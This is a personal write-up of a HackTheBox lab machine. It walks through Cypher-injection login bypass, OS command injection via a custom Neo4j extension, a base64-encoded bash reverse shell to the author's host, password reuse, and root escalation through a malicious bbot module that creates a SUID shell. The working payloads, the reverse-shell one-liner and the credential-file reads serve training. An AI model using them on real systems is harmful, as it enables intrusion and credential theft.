---
tags:
  - Linux
  - HTTP
  - Cypher injection
  - OS-command injection
  - Sudoers
  - Python
---

... is a medium HTB machine which hosts a `http` service which allows you to inject `cypher` code in the login form to bypass it. Afterwards, a mis-configured custom `cypher` extension allows you to inject OS commands. For the privilege escalation, a binary is executable as `root`, which allows you to load and execute additional python code.

### Reconnaissance
The tool `nmap` is used to do the initial reconnaissance of any target, as it very reliably sends packets to specific ports of the target to verify if they are open, closed, or filtered. The following command is used as a standard `nmap` scan:
```bash
sudo nmap -sCV $IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: optional, but makes the scan a bit faster and stealthier, as no TCP connect() is used.
# -sC (or --script=default): uses the default scripts of nmap. can quickly discover simple vulnerabilities, such as anonymous logins.
# -sV: further scans open ports to determine the actual service which is running on them, as an open port 80 does not directly imply a HTTP service.
```

the output of `nmap` tells us this:
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cypher.htb/
```
This is a very typical setup of a web-vulnerability type CTF. The output of the `http-title` `nmap` script tells us that the domain name `cypher.htb` is present. To quickly edit the `/etc/hosts` file for local DNS name resolution without a public DNS server, the following command appends an entry to that file:
```bash
echo "$IP cypher.htb" | sudo tee --append /etc/hosts
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# echo "...": writes the specified string into STDOUT (terminal)
# | : redirect (pipe) the STDOUT of the left command into the STDIN of the right command
# sudo tee --append /etc/hosts: write the received STDIN into a file without overwriting it. requires sudo, as that file is critical to the system  
```

After visiting `http://cypher.htb`, i am greeted with a `Graph ASM` title page. The other tabs of this web page include an `About`, and a  `Login` tab. The `view-source` reveals an interesting (and pretty edgy) comment:
```html
<!-- "what is the acceptable amount of suffering, is the question." -TheFunky1 -->
```
I will keep this name in mind for later.

To find more endpoints that may be hidden in the `view-source`, i use `ffuf` to employ forceful browsing using this command:
```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u "http://cypher.htb/FUZZ" -fs 162 -mc all
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -w: specify wordlist file
# -u: URL of the target. the FUZZ word gets replaced with each entry of the wordlist.
# -fs: filter by response size, as all responses with 162 are "404" errors.
# -mc: accept any response code
```

Besides `/about` and `/login`, it finds the following resources:

- `/api`: redirect to `/api/docs`, returns `"Not Found"`.
- `/demo`: redirect to `/login`.
- `/testing`: shows directory listing, where i am able to download `custom-apoc-extension-1.0-SNAPSHOT.jar`.

To find out what this `JAR` includes, i `sudo apt install jd-gui` (a java decompiler), and open it. It holds the two classes:

- `HelloWorldProcedure`: Has a method which prints `"Hello" + name` with a provided string.
- `CustomFunctions`: Uses the method `getUrlStatusCode` with a user provided `url` to execute the operating system command:

```java
{ "/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url };
```
There is no sanitization in place which prevents users from appending their own operating system commands (e.g. `; whoami`). I need to find out where i can access this method to get RCE!
Additionally, the package name is `com.cypher.neo4j.apoc`. `apoc` is an extension of `neo4j` which allows users to add user-defined functionality to `neo4j`. `neo4j` itself is a graph-based database management system which doesn't use traditional tables, but instead nodes, relationships and properties.

While i am at it, i decided to also do some `VHost` fuzzing using the `subdomains-top1million-5000.txt` from `SecLists` (for a more in-depth explanation, see my write-up on the `Three` challenge!):
```bash
ffuf -w ./subdomains-top1million-5000.txt -H "Host: FUZZ.cypher.htb" -u http://cypher.htb -fs 154
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -w: specify wordlist file
# -H: add specific header. Here, the header "FUZZ.alert.htb" is chosen. the FUZZ word is replaced by each entry of the wordlist!
# -u: URL of the target
# -fs: filter by response size
```

This didn't find anything, not even with a bigger word-list.

### Initial Exploitation
Back to the main page, i investigate the `/login` form. The `view-source` reveals something interesting in the `javascript`:
```js
// TODO: don't store user accounts in neo4j
```
When i send a login request, i can see that i send a `POST` request to `/api/auth` using the following data:
```js
{
	"username":"admin",
	"password":"password"
}
```
Naturally, i suspected an injection vulnerability. Instead of an SQL injection, this may be a `cypher` injection (language of `neo4j`). [This blog post](https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits) provides some nice info on how to exploit this. To test this suspicion, i try to mess with the query by sending the username `admin'` instead of only `admin`. Doing so reveals some very important information on the query which was used:
```cypher
MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin'' return h.value as hash
```
I looked into the [neo4j docs](https://neo4j.com/labs/apoc/4.1/cypher-execution/cypher-based-procedures-functions/) to find out how to call custom `apoc` functions (the ones in the `JAR`) and i cane up with this payload:
```js
{
	"username":"admin' CALL custom.getUrlStatusCode(\"test; ping -c 3 <my-IP>\") YIELD statusCode RETURN statusCode//",
	"password":"password"
}
```
Sadly, this did not work (not even by passing only my IP, as that should invoke a web-request based on the logic of `getUrlStatusCode`). My next guess would be to try and bypass the login. To do so, i try to understand the query which was used to do the login:

- `(u:USER)`: a node named `USER` gets stored in the variable `u`.
- `-[:SECRET->]`: find an outgoing (from `USER`) relationship of type `SECRET`, do not store this.
- `(h:SHA1)`: another node named `SHA1` (hashing algorithm), gets stored in `h`. `USER` node should have a relationship of type `SECRET` to this node.
- `WHERE u.name = 'admin'`: only keep the matches where the value `name` of the node `USER` equals `admin`(my value).
- `RETURN h.value as hash`: if the `USER.name` value (admin) exists, it presumably also has a `SHA1.value` (hashed password). That is returned.

To summarize this query, it takes the provided `username` parameter, searches for stored the `hash` of this user (presumably empty, if the user does not exist), and then returns the `SHA1-hash` of his password. The `password` parameter is not used in this query, which would mean that either:

- The password is completely ignored (unlikely), or
- The provided `password` is being hashed on the fly, and then compared with the result.

Assuming the second scenario, a clear exploitation path reveals itself:

1. Provide an easy password such as `password`, and compute the `SHA1` hash of it using `echo -n "password" | sha1sum`.
2. Inject a query which always returns this generated hash and ignores the rest of the query.
3. The server compares the received `SHA1` hash of `password` with the `SHA1` hash of the provided `password`, and lets us in!

The following payload uses this idea:
```js
{
	"username":"admin' return \"5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8\" as hash//",
	"password":"password"
}
```
This did not work though. After a bit of reflecting, i knew that this was the `cypher` query which was being executed:
```cypher
MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin' return \"5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8\" as hash// return h.value as hash
```
But this implies that the user `admin` does exist in the `USER` node, which shouldn't be taken for granted. I slightly change the payload so that the conditional `WHERE u.name` gets ignored, by appending a `OR 1=1`:
```js
{
	"username":"admin' OR 1=1 return \"5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8\" as hash//",
	"password":"password"
}
```
This finally gives me the `ok` and lets me pass!

This gives me the possibility to execute arbitrary `cypher` queries. My goal was clear before my eyes, as i have tried it previously in the login but failed. I enter the following query and start my `sudo tcpdump -i tun0 icmp` to listen for received `pings`:
```cypher
CALL custom.getUrlStatusCode("test; ping -c 3 <my-IP>") YIELD statusCode RETURN statusCode
```
And yes, i receive pings.

For the reverse shell i decided to encode it in `base64`, and then decode and execute it on the target, as it may mess with the query (it would also be possible to fetch a `revshell.sh` from my machine and pipe it into `bash`!). To encode the command i issue:
```bash
echo "bash -c '/bin/bash -i >& /dev/tcp/<my-IP>/1337 0>&1'" | base64
```
And on the target i decode and execute it using this `cypher` query:
```python
CALL custom.getUrlStatusCode("test; echo <base64> | base64 -d | bash -i") YIELD statusCode RETURN statusCode
```
As usual, i start the listener using `nc`:
```bash
nc -lvnp 1337
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -l: listen for inbound connects
# -v: verbose to get more info
# -n: numeric IP addresses, dont use DNS
# -p: specify listening port (1337)
```

And i receive a reverse shell from the user `neo4j`!

### Lateral Movement
As the user `neo4j` is only a service account, it has very limited capabilities on the system. An actual user account within the `/home` directory is much more preferable.
The user `graphasm` has a home directory, which is why i assumed that i need his account to gain `ssh` access to the machine. `ssh` access is always better than a reverse shell, as it is fully interactive. It is always possible to upgrade the reverse shell with a [neat trick](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/), but `ssh` access to an actual account is always preferable.

I use `cd` with no arguments, as that always puts you in the home directory of the current user (which is `/var/lib/neo4j` for `neo4j`). I use `ls -la` to see what i can find. The `.bash_history` stands out like a sore thumb so i read it, and it reveals:
```bash
neo4j-admin dbms set-initial-password cU4btyib.20xtCMCXkBmerhK
```

I could now try to access the database, but it probably wouldn't reveal much, as that is the `neo4j` database used in the web-interface (it can already be queried). So i try a password reuse attack on the user `graphasm`'s `ssh` and it works!

### Privilege Escalation
I try the usual suspects of privilege escalation:

- `sudo -l`: mis-configured `sudoer` file
- `netstat -tulnp`: hidden services only accessible via localhost
- `id`: user belonging to a weird group

`sudo -l` reveals that `graphasm` can execute `/usr/local/bin/bbot` as `root`! Interestingly enough, `netstat -tulnp` also revealed a new web port on `127.0.0.1:8000`, and two ports on `7687` and `7474` which are neither on `127.0.0.1`, nor `0.0.0.0`, but on a specific IP-address!

The `bbot_preset.yml` in `graphasms` home directory reveals the following:
```yml
targets:

  - ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK
```
`ecorp.htb` is presumably the domain of the specific IP-address which i have found in `netstat -tulnp`.

The official [github](https://github.com/blacklanternsecurity/bbot) `BEE-(b)bot` is a multipurpose scanner to do reconnaissance on subdomain finding, web-spidering, and so on. I quickly find out on [gtfobins](https://gtfobins.org/gtfobins/bbot/) that the `bbot` binary allows you to read arbitrary files using this command:
```bash
bbot -d -cy /path/to/input-file
```
I try this command as non-root on a file i know its contents of to see where its output is stored. It shows up in this debug line:
```bash
internal.excavate: Final combined yara rule contents: <files-content>
```
If the file does not exist, it prints something like this:
```bash
internal.excavate: Custom yara rules file is NOT a file. Will attempt to treat it as rule content
```

I tried reading `/root/.ssh/id_rsa`, but that did not exist. I also read `/etc/shadow` to try and crack it but it somehow doesn't work. I could also simply read `/root/root.txt` but that is cheating (didn't get RCE) and cheating is bad!

Further googling reveals [this seclists disclosure](https://seclists.org/fulldisclosure/2025/Apr/19). It tells us that `bbot` version `2.1.0` (the version running on the machine) allows you to load custom modules (python code), which enable arbitrary python code execution. To so, a `preset.yml` is required, which tells `bbot` to load the custom module. I create the following module `evil.py` which creates a copy of `/bin/bash` and sets the `SetUID` flag. As this python code is executed as root, its a free `bash` as `root`! The code looks as follows:
```python
from bbot.modules.base import BaseModule
import os

class evil(BaseModule):
    async def setup(self):
        os.system("cp /bin/bash /tmp/rootme; chmod u+s /tmp/rootme")
```
Then i slightly change the `bbot_preset.yml` to make it use my custom module:
```yml
targets:

  - ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK

module_dirs:

  - .

modules:

  - evil

```

After running `bbot` as `root` and specifying the `preset.yml`:
```bash
sudo /usr/local/bin/bbot -p ./bbot_preset.yml
```
I can become root with this command:
```bash
/tmp/rootme -p
```

### Having some fun
I found out that the `ssh` key for root was present, but it was named `id_ed25519` and not `id_rsa`! Next time, i will search for more key names when i get a file read as `root`.

So i try to verify if this is actually a viable `privesc` vector by reading it using `bbot`:
```bash
sudo /usr/local/bin/bbot -d -cy /root/.ssh/id_ed25519
```
I save the file contents in a `root-key` file and issue `chmod 400 root-key` so that `ssh` accepts it. When i try to do `ssh -i ./root-key root@$IP`, it still asks for `root`'s password, so this wouldn't have worked in the first place (i'm glad...).

The other thing i wanted to investigate is the output of `netstat -tulnp`. I make it accessible via my own browser by forwarding its port to my local machine using:
```bash
ssh -L 1337:localhost:8000 graphasm@$IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# 1337: port on our machine which gets opened. If talked to, ssh will forward it to the target port. can be any port.
# localhost: the remote host we want to reach. NOT $IP, as we want to be localhost (127.0.0.1) on the target.
# 8000: the remote port which gets interacted with when interacting with port 1337 on the local machine.
```

It turns out that this was the `API` endpoint which was used for logging on etc...

The other two ports `7687` and `7474` turned out to be `neo4j` specific ports. Sadly the comment with the user `TheFunky1` didn't help in this challenge...